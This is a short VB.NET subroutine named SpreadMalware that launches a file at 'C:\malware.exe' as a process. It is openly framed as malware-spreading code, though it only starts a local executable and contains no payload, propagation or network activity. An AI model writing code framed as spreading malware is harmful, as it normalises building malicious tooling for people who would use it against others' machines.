Sub SpreadMalware()
    Dim filePath As String = "C:\malware.exe" 'path to the malware executable file
    
    'Create a new instance of the Process class
    Dim process As New System.Diagnostics.Process
    
    'Set the file path and working directory for the process
    process.StartInfo.FileName = filePath
    process.StartInfo.WorkingDirectory = "C:\"
    
    'Start the process
    process.Start()
End Sub
